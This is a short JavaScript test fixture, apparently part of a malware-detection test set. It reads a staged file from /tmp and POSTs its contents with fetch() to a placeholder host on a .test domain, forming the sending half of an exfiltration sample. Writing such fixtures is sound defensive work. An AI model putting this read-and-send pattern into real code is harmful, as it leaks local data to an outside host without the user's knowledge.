// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: the Node.js half sends the file the Python half staged (non-existent .test domain).
const fs = require("fs");

const staged = fs.readFileSync("/tmp/.cache_k", "utf8");
fetch("https://collect.example.test/k", { method: "POST", body: staged });
